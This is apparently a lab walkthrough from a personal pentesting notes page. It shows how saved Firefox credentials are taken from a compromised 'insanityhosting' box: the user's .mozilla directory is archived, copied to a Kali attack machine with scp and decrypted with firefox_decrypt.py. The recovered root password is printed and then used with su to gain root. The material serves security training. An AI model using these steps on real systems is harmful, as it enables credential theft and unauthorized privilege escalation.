---
layout: default
title: Mozilla Decrypt
parent: Cracking
nav_order: 6
---

# Mozilla Decrypt

---

There is a _.mozilla_ directory we can maybe get creds from.

Tar the directory and transfer to our attack machine.

```bash

# Tar the entire .mozilla directory
[elliot@insanityhosting ~]$ tar -czf mozilla.tgz .mozilla/

# Netcat not available so use SCP to transfer to attack box
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ scp elliot@192.168.202.124:mozilla.tgz .
elliot@192.168.202.124s password:
mozilla.tgz                                                           100%   40MB   1.9MB/s   00:21

# Extract the files
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ tar -xzf mozilla.tgz


```

We'll use the _firefox_decrypt.py_ script to extract any credentials in the Mozilla files.

[Firefox Decrypt GitHub Raw Code](https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ wget https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py
--2023-11-18 21:24:26--  https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 39242 (38K) [text/plain]
Saving to: ‘firefox_decrypt.py’

firefox_decrypt.py        100%[=====================================>]  38.32K  --.-KB/s    in 0.01s

2023-11-18 21:24:26 (3.01 MB/s) - ‘firefox_decrypt.py’ saved [39242/39242]


```

Run the _firefox_decrypt.py_ on _.mozilla/firefox_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ python3 firefox_decrypt.py .mozilla/firefox/
Select the Mozilla profile you wish to decrypt
1 -> wqqe31s0.default
2 -> esmhp32w.default-default
2

Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'

```

Use the extracted password to switch to the _root_ user.

```bash
[elliot@insanityhosting ~]$ su root
Password:
[root@insanityhosting elliot]# id
uid=0(root) gid=0(root) groups=0(root)
[root@insanityhosting elliot]# whoami
root

```
